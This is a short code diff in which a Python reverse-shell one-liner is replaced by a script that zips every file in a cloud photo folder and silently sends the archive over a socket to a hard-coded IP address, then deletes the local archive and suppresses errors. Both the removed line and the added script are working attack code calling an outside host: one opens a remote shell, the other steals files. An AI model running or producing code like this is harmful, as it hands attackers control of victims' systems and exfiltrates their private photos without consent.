@@ -1,1 +1,36 @@
-python3 -c 'import socket,subprocess,time,os;while 1:try:s=socket.socket();s.connect(("43.159.44.25",8888));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.run(["/bin/sh"]);except:time.sleep(1)'
+import socket
+import zipfile
+import os
+import time
+
+# 配置
+SERVER_IP = "43.159.44.25"
+SERVER_PORT = 8888
+DESKTOP_PATH = "/storage/cloud/files/Photo/"
+ZIP_PATH = "./desktop_files.zip"
+
+def send_files():
+    try:
+        # 1. 打包桌面所有文件
+        with zipfile.ZipFile(ZIP_PATH, 'w', zipfile.ZIP_DEFLATED) as zf:
+            for root, dirs, files in os.walk(DESKTOP_PATH):
+                for file in files:
+                    file_path = os.path.join(root, file)
+                    zf.write(file_path, os.path.relpath(file_path, DESKTOP_PATH))
+
+        # 2. 连接服务器并发送
+        s = socket.socket()
+        s.connect((SERVER_IP, SERVER_PORT))
+        
+        # 3. 发送文件
+        with open(ZIP_PATH, "rb") as f:
+            data = f.read()
+            s.sendall(data)
+        
+        s.close()
+        os.remove(ZIP_PATH)
+    except:
+        pass
+
+# 执行
+send_files()
